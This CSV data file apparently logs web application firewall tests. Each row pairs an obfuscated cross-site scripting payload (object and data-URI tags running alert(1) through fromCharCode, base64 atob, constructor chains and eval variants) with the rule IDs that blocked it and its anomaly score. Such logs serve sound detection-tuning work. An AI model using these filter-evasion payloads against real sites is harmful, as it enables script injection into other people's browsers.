1823,"<object data=""data:text/html,<script>new Function(String['fromCharCode'](97,108,101,114,116,40,49,41))()</script>""></object>",0,1,block,10,"933210,934100,941100,941110,941130,941140,941160,941170,941300,949110","o49,55v217,124t:urlDecode,t:replaceComments,t:compressWhitespace || o37,13v217,124 || v217,124t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,124t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,124t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,124t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,124t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,124t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,124t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",45,177603491846.717013
1824,"<object data=""data:text/html,<script>new(function(){return this.constructor.constructor})()('\u0061\u006c\u0065\u0072\u0074(1)')()</script>""></object>",0,1,block,10,"933210,934100,941100,941110,941130,941140,941160,941170,941300,949110","o40,90v217,150t:urlDecode,t:replaceComments,t:compressWhitespace || o41,11v217,150 || v217,150t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,150t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,150t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,150t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,150t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,150t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,150t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",45,177603491968.873678
1825,"<object data=""data:text/html,<script>new Function('\u0061\u006c'+'\u0065\u0072\u0074(1)')()</script>""></object>",0,1,block,10,"934100,934100,941100,941110,941130,941140,941160,941170,941300,949110","o37,13v217,111 || o37,13v217,111t:urlDecodeUni || v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",45,177603492030.596280
1826,"<object data=""data:text/html,<script>new Function('a\u006c\u0065\u0072\u0074(1)')()</script>""></object>",0,1,block,9,"934100,941100,941110,941130,941140,941160,941170,941300,949110","o37,13v217,103 || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177603492123.612097
1836,"<object data=""data:text/html,<svg onload=(Function)('al'+'ert(1)')()></svg>""></object>",0,1,block,9,"933210,941100,941120,941130,941140,941160,941170,941300,949110","o41,27v217,86t:urlDecode,t:replaceComments,t:compressWhitespace || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o33,8v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,69v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,41v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177603493335.217298
1845,"<object data=""data:text/html,<svg onload=Function.prototype.constructor('al'+'ert(1)')()></svg>""></object>",0,1,block,8,"941100,941120,941130,941140,941160,941170,941300,949110","v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o33,8v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,89v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,41v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603494373.088477
1849,"<object data='data:text/html,<script>[][""filter""][""constructor""](""al""+""ert(1)"")()</script>'></object>",0,1,block,9,"933210,941100,941110,941130,941140,941160,941170,941300,949110","o37,44v217,101t:urlDecode,t:replaceComments,t:compressWhitespace || v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177603494755.934110
1852,"<object data='data:text/html,<script>(()=>{return this})()[""Function""](""al""+""ert(1)"")()</script>'></object>",0,1,block,10,"932130,933210,941100,941110,941130,941140,941160,941170,941300,949110","o35,45v217,107t:urlDecodeUni,t:cmdLine || o56,31v217,107t:urlDecode,t:replaceComments,t:compressWhitespace || v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",45,17760349516.153107
1859,"<object data='data:text/html,<script>new Function(atob(""YWxlcnQoMSk=""))()</script>'></object>",0,1,block,9,"934100,941100,941110,941130,941140,941160,941170,941300,949110","o37,13v217,93 || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177603495978.471158
1864,"<object data='data:text/html,<script>Reflect[""get""](self,""Function"")(""al""+""ert(1)"")()</script>'></object>",0,1,block,9,"933210,941100,941110,941130,941140,941160,941170,941300,949110","o44,41v217,105t:urlDecode,t:replaceComments,t:compressWhitespace || v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177603496444.892282
1865,"<object data='data:text/html,<script>Object[""getOwnPropertyDescriptor""](window,""Function"")[""value""](""al""+""ert(1)"")()</script>'></object>",0,1,block,9,"933210,941100,941110,941130,941140,941160,941170,941300,949110","o43,73v217,136t:urlDecode,t:replaceComments,t:compressWhitespace || v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177603496518.255286
1867,"<object data='data:text/html,<svg xmlns=""http://www.w3.org/2000/svg""><script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script></svg>'></object>",0,1,block,10,"933160,934100,941100,941110,941130,941140,941160,941170,941300,949110","o77,54v217,157 || o77,5v217,157 || v217,157t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o69,8v217,157t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,157t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,69v217,157t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,157t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,157t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,157t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",45,177603496831.615803
1868,"<object data='data:text/html,<svg xmlns=""http://www.w3.org/2000/svg""><script>Function(""ale""+""rt(1)"")()</script></svg>'></object>",0,1,block,8,"941100,941110,941130,941140,941160,941170,941300,949110","v217,128t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o69,8v217,128t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,128t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,69v217,128t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,128t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,128t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,128t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603496960.318141
1871,"<object data='data:text/html,<svg xmlns=""http://www.w3.org/2000/svg""><script>globalThis[""\x65val""](atob(""YWxlcnQoMSk=""))</script></svg>'></object>",0,1,block,8,"941100,941110,941130,941140,941160,941170,941300,949110","v217,146t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o69,8v217,146t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,146t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,69v217,146t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,146t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,146t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,146t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603497213.431717
1872,"<object data='data:text/html,<svg xmlns=""http://www.w3.org/2000/svg""><script>eval.call(null,atob(""YWxlcnQoMSk=""))</script></svg>'></object>",0,1,block,8,"941100,941110,941130,941140,941160,941170,941300,949110","v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o69,8v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,69v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603497356.561785
1874,"<object data='data:text/html,<svg xmlns=""http://www.w3.org/2000/svg""><script>self[""ev""+""al""](atob(""YWxlcnQoMSk=""))</script></svg>'></object>",0,1,block,10,"933210,941100,941110,941130,941140,941160,941170,941300,941370,949110","o81,33v217,140t:urlDecode,t:replaceComments,t:compressWhitespace || v217,140t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o69,8v217,140t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,140t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,69v217,140t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,140t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,140t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,140t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o77,15v217,140t:urlDecodeUni,t:compressWhitespace || ",45,177603497697.188970
1878,"<object data='data:text/html,<svg xmlns=""http://www.w3.org/2000/svg""><script>setInterval(atob(""YWxlcnQoMSk=""),1)</script></svg>'></object>",0,1,block,8,"941100,941110,941130,941140,941160,941170,941300,949110","v217,138t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o69,8v217,138t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,138t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,69v217,138t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,138t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,138t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,138t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603498164.685851
1879,"<object data='data:text/html,<svg xmlns=""http://www.w3.org/2000/svg""><script>({}).constructor.constructor(atob(""YWxlcnQoMSk=""))()</script></svg>'></object>",0,1,block,9,"932130,941100,941110,941130,941140,941160,941170,941300,949110","o73,51v217,155t:urlDecodeUni,t:cmdLine || v217,155t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o69,8v217,155t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,155t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,69v217,155t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,155t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,155t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,155t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177603498260.883529
1882,"<object data='data:text/html,<svg xmlns=""http://www.w3.org/2000/svg""><script>eval/**/( /**/atob(""YWxlcnQoMSk="")/**/)</script></svg>'></object>",0,1,block,9,"933160,941100,941110,941130,941140,941160,941170,941300,949110","o77,39v217,142 || v217,142t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o69,8v217,142t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,142t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,69v217,142t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,142t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,142t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,142t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177603498651.943263
1885,"<object data='data:text/html,<svg xmlns=""http://www.w3.org/2000/svg""><script>new Function(atob(""YWxlcnQoMSk=""))()</script></svg>'></object>",0,1,block,9,"934100,941100,941110,941130,941140,941160,941170,941300,949110","o77,13v217,139 || v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o69,8v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,69v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,17760349898.771914
1886,"<object data='data:text/html,<svg xmlns=""http://www.w3.org/2000/svg""><script>import(atob(""ZGF0YTp0ZXh0L2phdmFzY3JpcHQsYWxlcnQoMSk=""))</script></svg>'></object>",0,1,block,8,"941100,941110,941130,941140,941160,941170,941300,949110","v217,159t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o69,8v217,159t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,159t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,69v217,159t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,159t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,159t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,159t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603499042.375036
1887,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='eval(atob(&quot;YWxlcnQoMSk=&quot;))'></svg>""></object>",0,1,block,10,"933160,934100,941100,941120,941130,941140,941160,941170,941300,949110","o94,36v217,149 || o94,5v217,149 || v217,149t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,149t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,149t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,122v217,149t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,149t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,149t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,149t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",45,177603499132.666752
1888,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='Function(&quot;al&quot;+&quot;ert(1)&quot;)()'></svg>""></object>",0,1,block,8,"941100,941120,941130,941140,941160,941170,941300,949110","v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,121v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603499290.898590
1889,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='[].constructor.constructor(&quot;al&quot;+&quot;ert(1)&quot;)()'></svg>""></object>",0,1,block,8,"941100,941120,941130,941140,941160,941170,941300,949110","v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,139v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603499353.416641
1890,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'></svg>""></object>",0,1,block,10,"933160,934100,941100,941120,941130,941140,941160,941170,941300,949110","o94,54v217,167 || o94,5v217,167 || v217,167t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,167t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,167t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,150v217,167t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,167t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,167t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,167t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",45,177603499520.311192
